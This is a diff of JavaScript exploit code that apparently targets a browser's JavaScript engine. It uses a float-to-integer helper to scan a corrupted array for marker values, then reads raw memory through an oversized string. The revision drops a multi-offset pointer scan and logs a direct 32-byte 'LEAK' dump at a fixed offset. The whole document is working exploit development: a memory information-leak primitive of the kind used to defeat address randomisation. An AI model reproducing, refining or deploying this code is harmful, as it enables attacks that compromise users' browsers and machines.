@@ -55,7 +55,7 @@ if(Array.isArray(m)){
   // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
   // collect ALL marker candidates
   const cands=[];
-  for(let k=0x8000;k<0x70000;k++){
+  for(let k=0x8000;k<0x10000;k++){
     try{
       const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
       if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
@@ -122,16 +122,9 @@ if(Array.isArray(m)){
         }
         log("NL:"+es.length.toString(16));
         if(es.length===0x01200000){
-          // scan offsets for non-zero pointer-like qwords
-          const offs=[0x1000,0x2000,0x4000,0x8000,0x10000,0x18000,0x20000,0x30000,0x40000];
-          const found=[];
-          for(const off of offs){
-            let s="";
-            for(let j2=0;j2<8;j2++){s+=es.charCodeAt(off+j2).toString(16).padStart(2,"0");}
-            if(s!=="0000000000000000"){found.push(off.toString(16)+":"+s);}
-            if(found.length>=8)break;
-          }
-          log("SCAN:"+(found.length?found.join(","):"all_zero"));
+          let s="";
+          for(let j2=0;j2<32;j2++){s+=es.charCodeAt(0x1000+j2).toString(16).padStart(2,"0");}
+          log("LEAK:"+s);
         }
       }else{log("OFF_BAD:"+off.toString(16));}
     }catch(e){log("ESE:"+e.message);}
